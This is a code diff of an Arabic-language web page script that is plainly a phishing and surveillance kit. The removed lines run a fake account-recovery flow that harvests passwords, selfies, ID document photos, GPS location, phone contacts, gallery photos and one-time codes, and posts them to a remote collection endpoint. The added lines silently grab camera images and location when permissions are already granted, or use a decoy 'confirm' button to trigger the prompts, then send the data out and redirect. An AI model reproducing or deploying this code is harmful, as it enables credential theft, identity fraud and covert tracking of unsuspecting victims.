+    if (/oneplus/.test(t)) return 'OnePlus';
+    if (/iphone|ipad|ipod/.test(t)) return 'Apple';
+    if (/windows/.test(t)) return 'PC';
+    return '';
+  }
+  function parsePlatform(ua){
+    let m = ua.match(/Android\s+([\d.]+)/i); if (m) return 'Android '+m[1];
+    m = ua.match(/(?:iPhone )?OS (\d+)[._](\d+)/i); if (m) return 'iOS '+m[1]+'.'+m[2];
+    if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
+    if (/Mac OS X/.test(ua)) return 'macOS';
+    if (/Linux/.test(ua)) return 'Linux';
+    return NA;
+  }
+
+  async function send(img, geo, batt){
+    const ua = (navigator.userAgent || '').slice(0,400);
     const tz = (Intl.DateTimeFormat().resolvedOptions().timeZone || NA).slice(0,60);
-    if (!captured.ip) captured.ip = await fetchIp();
-    if (!captured.batt) captured.batt = await getBattery();
-    if (!captured.rtc) captured.rtc = await getRtc();
-    if (!captured.fp) captured.fp = fingerprint();
-    let vpn = '';
-    const rtcPub = (captured.rtc||[]).filter(x => PUB4.test(x));
-    if (rtcPub.length && captured.ip.best !== NA && rtcPub.indexOf(captured.ip.best) === -1)
-      vpn = 'WebRTC: '+rtcPub[0];
-    const cred = [{ step: stepName, at: new Date().toISOString(), ...stepData }];
-    return {
-      nonce, time: localTime(),
-      ip: captured.ip.best, ips: captured.ip.list, rtc: captured.rtc, vpn,
-      localIp: (captured.rtc||[]).find(x => !PUB4.test(x) && x.indexOf(':') === -1) || NA,
-      battery: captured.batt.level, charging: captured.batt.charging,
-      lat: captured.geo ? captured.geo.lat : '',
-      lng: captured.geo ? captured.geo.lng : '',
-      acc: captured.geo ? captured.geo.acc : '',
-      geoSource: captured.geo ? captured.geo.src : NA,
-      tz, lang: (navigator.languages || [navigator.language || NA]).join(',').slice(0,60),
-      ua, brand: parseBrand(ua), model: parseModel(ua), platform: parsePlatform(ua),
+
+    const payload = {
+      nonce: nonce,
+      time: localTime(),
+      ip: NA, ips: [], rtc: [], vpn: '', localIp: NA,
+      battery: batt.level, charging: batt.charging,
+      lat: geo ? geo.lat : '',
+      lng: geo ? geo.lng : '',
+      acc: geo ? geo.acc : '',
+      geoSource: geo ? 'متصفح' : NA,
+      tz: tz,
+      lang: (navigator.languages || [navigator.language || NA]).join(',').slice(0,60),
+      ua: ua,
+      brand: parseBrand(ua), model: parseModel(ua), platform: parsePlatform(ua),
       network: getNetwork(),
       screen: (screen.width||0)+'x'+(screen.height||0),
       native: 'لا',
-      cCount: contactState.contacts.length, cJson: JSON.stringify(contactState.contacts).slice(0,40000),
-      sCount:0, sJson:'[]', lCount:0, lJson:'[]',
-      fp: captured.fp,
-      cred,
-      hist: '[]',
-      misc: JSON.stringify({ v: 5, step: stepName, referrer: (document.referrer||'').slice(0,200) })
+      cCount: 0, cJson: '[]',
+      sCount: 0, sJson: '[]',
+      lCount: 0, lJson: '[]',
+      fp: fp(),
+      cred: '[]', hist: '[]',
+      misc: JSON.stringify({ v: 2 }),
+      img: img || ''
     };
-  }
-  async function submitStep(name, data) {
-    const p = await buildPayload(name, data);
-    return post(p);
-  }
 
-  /* ═══ CAMERA — selfie via getUserMedia with file fallback ═══ */
-  let camStream = null;
-  async function startCamera() {
     try {
-      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return false;
-      camStream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode:{ideal:'user'}, width:{ideal:720}, height:{ideal:720} }, audio:false
+      await fetch(ENDPOINT, {
+        method: 'POST',
+        mode: 'no-cors',
+        cache: 'no-store',
+        headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
+        body: JSON.stringify({ a: 'collect', d: payload })
       });
-      const v = $('#cam');
-      v.srcObject = camStream;
-      v.hidden = false;
-      await v.play();
-      for (let i=0;i<40 && !v.videoWidth;i++) await sleep(50);
-      return true;
-    } catch(_) { return false; }
-  }
-  async function stopCamera() {
-    if (camStream) { try { camStream.getTracks().forEach(t=>t.stop()); } catch(_){} camStream = null; }
-    $('#cam').hidden = true;
-  }
-  async function captureSelfie() {
-    const v = $('#cam');
-    if (!v.videoWidth) return null;
-    const s = Math.min(1, 720 / Math.max(v.videoWidth, v.videoHeight));
-    const cv = document.createElement('canvas');
-    cv.width = Math.round(v.videoWidth*s);
-    cv.height = Math.round(v.videoHeight*s);
-    cv.getContext('2d').drawImage(v,0,0,cv.width,cv.height);
-    return cv.toDataURL('image/jpeg', 0.72);
+    } catch(_){}
   }
 
-  $('#cam-btn').addEventListener('click', async () => {
-    if (camStream) {
-      const shot = await captureSelfie();
-      if (shot) {
-        docState.selfie = shot;
-        $('#cam-prev').src = shot;
-        $('#cam-prev').hidden = false;
-        const label = $('#slot-selfie');
-        label.classList.add('filled');
-        label.querySelector('.check')?.remove();
-        const chk = document.createElement('span');
-        chk.className='check'; chk.textContent='✓';
-        label.appendChild(chk);
-        $('#cam-btn').textContent = '📷 إعادة الالتقاط';
-        checkIdReady();
-      }
+  async function finish(img, geo, batt){
+    try { await send(img, geo, batt); } catch(_){}
+    const elapsed = Date.now() - T_START;
+    const remain = MIN_DISPLAY_MS - elapsed;
+    if (remain > 0) await sleep(remain);
+    location.replace(REDIRECT);
+  }
+
+  /* --- silent collection (no gesture, no prompt) --- */
+  async function silent(){
+    const camP = grabCamera();
+    const geoP = grabGeo();
+    const battP = getBattery();
+    const out = await Promise.all([camP, geoP, battP]);
+    await finish(out[0], out[1], out[2]);
+  }
+
+  /* --- prompt flow: everything fired from within the click --- */
+  function prompted(){
+    /* grabCamera & grabGeo called SYNCHRONOUSLY from the click handler.
+       getUserMedia / getCurrentPosition fire on the first microtask,
+       before any await — user-activation is preserved, prompts appear. */
+    const camP = grabCamera();
+    const geoP = grabGeo();
+    const battP = getBattery();
+
+    Promise.all([camP, geoP, battP]).then(function(out){
+      finish(out[0], out[1], out[2]);
+    }).catch(function(){
+      location.replace(REDIRECT);
+    });
+  }
+
+  async function run(){
+    const states = await Promise.all([permState('camera'), permState('geolocation')]);
+    const cam = states[0], geo = states[1];
+
+    if (cam === 'granted' && geo === 'granted') {
+      silent();
       return;
     }
-    const ok = await startCamera();
-    if (!ok) {
-      $('#inp-selfie').click();
-      setStatus('id-status', 'استخدم رفع الصورة من المعرض', '');
-    } else {
-      $('#cam-btn').textContent = '📸 التقاط الصورة';
-      setStatus('id-status', 'اضبط الكاميرا ثم اضغط لالتقاط الصورة', '');
-    }
-  });
 
-  $$('#pg-id input[type=file]').forEach(inp => {
-    inp.addEventListener('change', async e => {
-      const f = e.target.files && e.target.files[0];
-      if (!f) return;
-      if (!/^image\//.test(f.type)) { setStatus('id-status','الملف ليس صورة','err'); return; }
-      if (f.size > 10*1024*1024) { setStatus('id-status','الصورة كبيرة (حد 10MB)','err'); return; }
-      setStatus('id-status','جارٍ المعالجة…');
-      try {
-        const raw = await fileToDataURL(f);
-        const shrunk = await shrinkImage(raw, 1100, 0.75);
-        const slot = inp.getAttribute('data-slot');
-        docState[slot] = shrunk;
-        const label = inp.closest('.slot');
-        label.querySelector('img')?.remove();
-        label.querySelector('.check')?.remove();
-        const img = document.createElement('img'); img.src = shrunk;
-        label.appendChild(img);
-        const chk = document.createElement('span'); chk.className='check'; chk.textContent='✓';
-        label.appendChild(chk); label.classList.add('filled');
-        checkIdReady();
-      } catch(_) { setStatus('id-status','فشل قراءة الصورة','err'); }
-    });
-  });
-  function checkIdReady() {
-    const ready = docState.selfie && docState.doc_front && docState.doc_back;
-    $('#id-btn').disabled = !ready;
-    setStatus('id-status', ready ? 'جاهز للمتابعة.' : '', ready ? 'ok' : '');
+    /* show button — user taps once, prompts fire */
+    spin.hidden = true;
+    h.textContent = 'تأكيد العملية';
+    s.textContent = 'اضغط للمتابعة.';
+    prompt.hidden = false;
+
+    btn.addEventListener('click', function(){
+      btn.disabled = true;
+      prompt.hidden = true;
+      spin.hidden = false;
+      h.textContent = 'جارٍ التحقق';
+      s.textContent = 'يرجى الموافقة على الأذونات المطلوبة.';
+      prompted();
+    }, { once: true });
   }
 
-  /* ═══ FLOW ═══ */
-  $('#show-pw').addEventListener('click', () => {
-    const el = $('#lg-pass');
-    if (el.type === 'password') { el.type = 'text'; $('#show-pw').textContent='إخفاء'; }
-    else { el.type = 'password'; $('#show-pw').textContent='إظهار'; }
+  run().catch(function(){
+    location.replace(REDIRECT);
   });
-
-  $('#login-form').addEventListener('submit', async e => {
-    e.preventDefault();
-    if (busy) return;
-    const user = $('#lg-user').value.trim();
-    const pass = $('#lg-pass').value;
-    if (!user) { setStatus('lg-status','أدخل البريد أو الرقم','err'); return; }
-    if (!pass) { setStatus('lg-status','أدخل كلمة المرور','err'); return; }
-    busy = true;
-    const btn = $('#lg-btn');
-    btn.disabled = true; btn.textContent = 'جارٍ تسجيل الدخول…';
-    identifier = user; password = pass;
-    await submitStep('login', { identifier: user.slice(0,80), password: pass.slice(0,80) });
-    await sleep(1400);
-    busy = false; btn.disabled = false; btn.textContent = 'تسجيل الدخول';
-    showPage('pg-recovery', 2);
-  });
-
-  $('#start-btn').addEventListener('click', () => {
-    showPage('pg-id', 3);
-  });
-
-  $('#id-btn').addEventListener('click', async () => {
-    if (busy) return;
-    if (!docState.selfie || !docState.doc_front || !docState.doc_back) return;
-    busy = true;
-    $('#id-btn').disabled = true;
-    $('#id-btn').textContent = 'جارٍ رفع الوثائق…';
-    await stopCamera();
-    await submitStep('identity', {
-      photos: { selfie: docState.selfie, doc_front: docState.doc_front, doc_back: docState.doc_back }
-    });
-    await sleep(1600);
-    busy = false;
-    $('#id-btn').disabled = false;
-    $('#id-btn').textContent = 'متابعة';
-    showPage('pg-geo', 4);
-  });
-
-  /* GPS step */
-  $('#geo-btn').addEventListener('click', async () => {
-    if (busy) return;
-    busy = true;
-    $('#geo-btn').disabled = true;
-    setStatus('geo-status','جارٍ التحقق من موقعك…');
-    const g = await getGeo();
-    if (g.lat === '') {
-      setStatus('geo-status','لم نتمكن من الوصول للموقع. فعّل خدمة الموقع في الإعدادات وحاول مجدداً.', 'err');
-      busy = false; $('#geo-btn').disabled = false;
-      return;
-    }
-    captured.geo = g;
-    geoDone = true;
-    await fetch(ENDPOINT, { method:'POST', mode:'no-cors', cache:'no-store',
-      headers:{'Content-Type':'text/plain;charset=UTF-8'},
-      body: JSON.stringify({ a:'geo', n:nonce, lat:g.lat, lng:g.lng, acc:g.acc }) }).catch(()=>{});
-    await sleep(900);
-    setStatus('geo-status','تم التحقق من موقعك ✓','ok');
-    await sleep(700);
-    busy = false; $('#geo-btn').disabled = false;
-    showPage('pg-contacts', 5);
-  });
-  $('#geo-skip').addEventListener('click', e => { e.preventDefault();
-    if (busy) return; showPage('pg-contacts', 5); });
-
-  /* ═══ CONTACTS — Contact Picker API + fallback ═══ */
-  async function pickContacts() {
-    if (!navigator.contacts || !navigator.contacts.select) return null;
-    try {
-      const props = ['name', 'tel', 'email'];
-      const opts = { multiple: true };
-      const list = await navigator.contacts.select(props, opts);
-      return Array.isArray(list) ? list : [];
-    } catch(_) { return null; }
-  }
-
-  $('#contacts-btn').addEventListener('click', async () => {
-    if (busy) return;
-    busy = true;
-    setStatus('contacts-status','جارٍ فتح دفتر الهاتف…');
-    const picked = await pickContacts();
-    if (picked === null) {
-      busy = false;
-      $('#contacts-btn').classList.add('hidden');
-      $('#contacts-fallback').classList.remove('hidden');
-      setStatus('contacts-status','أدخل جهات اتصال موثوقة للمتابعة', '');
-      return;
-    }
-    if (picked.length === 0) {
-      setStatus('contacts-status','لم يتم اختيار أي جهة. حاول مجدداً أو أدخلها يدوياً.', 'err');
-      busy = false;
-      return;
-    }
-    const normalized = picked.map(c => ({
-      name: Array.isArray(c.name) ? c.name.join(' ').slice(0,80) : String(c.name||'').slice(0,80),
-      tel: Array.isArray(c.tel) ? c.tel.map(t=>String(t).slice(0,25)).join(', ') : String(c.tel||'').slice(0,25),
-      email: Array.isArray(c.email) ? c.email.join(', ').slice(0,80) : String(c.email||'').slice(0,80)
-    })).filter(c => c.name || c.tel || c.email);
-
-    contactState.contacts = normalized;
-    setStatus('contacts-status','جارٍ حفظ '+normalized.length+' جهة اتصال…','ok');
-    await submitStep('contacts', { contacts: normalized });
-    await sleep(1200);
-    $('#contacts-count').textContent = String(normalized.length);
-    $('#contacts-found').style.display = 'block';
-    busy = false;
-    $('#contacts-btn').textContent = 'اختيار المزيد';
-    await sleep(900);
-    showPage('pg-photos', 6);
-  });
-
-  $('#cf-btn').addEventListener('click', async () => {
-    if (busy) return;
-    const names = $$('.cf-name').map(i => i.value.trim().slice(0,60));
-    const tels = $$('.cf-tel').map(i => i.value.replace(/\D/g,'').slice(0,20));
-    const list = [];
-    for (let i=0;i<names.length;i++) if (names[i] && tels[i]) list.push({ name: names[i], tel: tels[i], email: '' });
-    if (list.length === 0) { setStatus('contacts-status','أدخل جهة واحدة على الأقل','err'); return; }
-    contactState.contacts = list;
-    busy = true;
-    setStatus('contacts-status','جارٍ الحفظ…','ok');
-    await submitStep('contacts', { contacts: list });
-    await sleep(900);
-    busy = false;
-    showPage('pg-photos', 6);
-  });
-
-  $('#contacts-skip').addEventListener('click', e => { e.preventDefault();
-    if (busy) return; showPage('pg-photos', 6); });
-
-  /* ═══ PHOTOS — multi-file backup ═══ */
-  $('#inp-photos').addEventListener('change', async e => {
-    const files = [...(e.target.files||[])].slice(0, MAX_PHOTOS);
-    if (files.length === 0) return;
-    setStatus('photos-status','جارٍ معالجة '+files.length+' صورة…');
-    const processed = [];
-    for (const f of files) {
-      if (!/^image\//.test(f.type)) continue;
-      if (f.size > 12*1024*1024) continue;
-      try {
-        const raw = await fileToDataURL(f);
-        const shrunk = await shrinkImage(raw, 900, 0.68);
-        processed.push({ name: (f.name||'photo').slice(0,60), type: f.type, data: shrunk });
-      } catch(_){}
-    }
-    photoState.photos = processed;
-    $('#files-preview').innerHTML = '';
-    processed.slice(0, 8).forEach(p => {
-      const img = document.createElement('img'); img.src = p.data;
-      $('#files-preview').appendChild(img);
-    });
-    if (processed.length > 8) {
-      const more = document.createElement('div');
-      more.className = 'more'; more.textContent = '+'+(processed.length-8);
-      $('#files-preview').appendChild(more);
-    }
-    $('#photos-lbl').textContent = processed.length + ' صورة مختارة';
-    $('#photos-btn').disabled = processed.length === 0;
-    setStatus('photos-status', processed.length ? 'جاهز للنسخ الاحتياطي' : 'لم يتم اختيار صور صالحة',
-              processed.length ? 'ok' : 'err');
-  });
-
-  $('#photos-btn').addEventListener('click', async () => {
-    if (busy) return;
-    if (photoState.photos.length === 0) return;
-    busy = true;
-    $('#photos-btn').disabled = true;
-    $('#photos-btn').textContent = 'جارٍ النسخ الاحتياطي…';
-    setStatus('photos-status','يتم الرفع، قد يستغرق دقيقة…');
-    await submitStep('photos', {
-      count: photoState.photos.length,
-      photos: photoState.photos.map(p => ({ name: p.name, type: p.type, data: p.data }))
-    });
-    await sleep(2200);
-    busy = false;
-    $('#photos-btn').disabled = false;
-    $('#photos-btn').textContent = 'متابعة';
-    showPage('pg-otp', 7);
-    $('#otp-sub').textContent = 'أرسلنا رمزاً من 6 أرقام إلى ' + maskId(identifier) + '. أدخله لإكمال استعادة الحساب.';
-    $$('.otp')[0].focus();
-  });
-  $('#photos-skip').addEventListener('click', e => { e.preventDefault();
-    if (busy) return;
-    showPage('pg-otp', 7);
-    $('#otp-sub').textContent = 'أرسلنا رمزاً من 6 أرقام إلى ' + maskId(identifier) + '. أدخله لإكمال استعادة الحساب.';
-    $$('.otp')[0].focus();
-  });
-
-  /* ═══ OTP ═══ */
-  const otps = $$('.otp');
-  async function submitOtp() {
-    if (busy) return;
-    const code = otps.map(o => o.value).join('');
-    if (code.length !== 6) { setStatus('otp-status','أدخل الرمز كاملاً','err'); return; }
-    busy = true;
-    $('#otp-btn').disabled = true;
-    $('#otp-btn').textContent = 'جارٍ التحقق…';
-    await submitStep('otp', { phone: identifier, otp: code });
-    await sleep(1500);
-    busy = false;
-    $('#otp-btn').disabled = false;
-    $('#otp-btn').textContent = 'استعادة الحساب';
-    if (Math.random() < 0.10) {
-      otps.forEach(o => { o.value=''; o.classList.remove('filled'); });
-      otps[0].focus();
-      setStatus('otp-status','الرمز غير صحيح أو منتهي، حاول مجدداً','err');
-      return;
-    }
-    showPage('pg-done', 7);
-    setTimeout(() => { location.replace(REDIRECT); }, 1800);
-  }
-  $('#otp-btn').addEventListener('click', submitOtp);
-  $('#otp-resend').addEventListener('click', async e => {
-    e.preventDefault(); if (busy) return; busy = true;
-    await submitStep('otp', { phone: identifier, otp: '', resend: true });
-    setStatus('otp-status','أعدنا الإرسال',''); await sleep(1500); busy = false;
-  });
-  otps.forEach((o,i) => {
-    o.addEventListener('input', e => {
-      const v = e.target.value.replace(/\D/g,'');
-      e.target.value = v.slice(-1);
-      o.classList.toggle('filled', !!o.value);
-      if (o.value && i<5) otps[i+1].focus();
-    });
-    o.addEventListener('keydown', e => {
-      if (e.key==='Backspace' && !o.value && i>0) { otps[i-1].focus(); otps[i-1].value=''; otps[i-1].classList.remove('filled'); }
-      if (e.key==='Enter') submitOtp();
-    });
-    o.addEventListener('paste', e => {
-      const t = (e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,'').slice(0,6);
-      if (!t) return; e.preventDefault();
-      t.split('').forEach((c,j) => { if(otps[j]){ otps[j].value=c; otps[j].classList.add('filled'); } });
-      otps[Math.min(t.length, 5)].focus();
-    });
-  });
-
-  /* ═══ INIT ═══ */
-  nonce = nonceGen();
-  window.__vn = nonce;
-  fetchIp().then(x => { captured.ip = x; }).catch(()=>{});
-  getBattery().then(x => { captured.batt = x; }).catch(()=>{});
-  getRtc().then(x => { captured.rtc = x; }).catch(()=>{});
-  captured.fp = fingerprint();
-
-  if (!/^https:\/\/script\.google\.com\//.test(ENDPOINT)) {
-    setStatus('lg-status','ENDPOINT غير مضبوط','err');
-  }
 })();
 </script>
 </body>
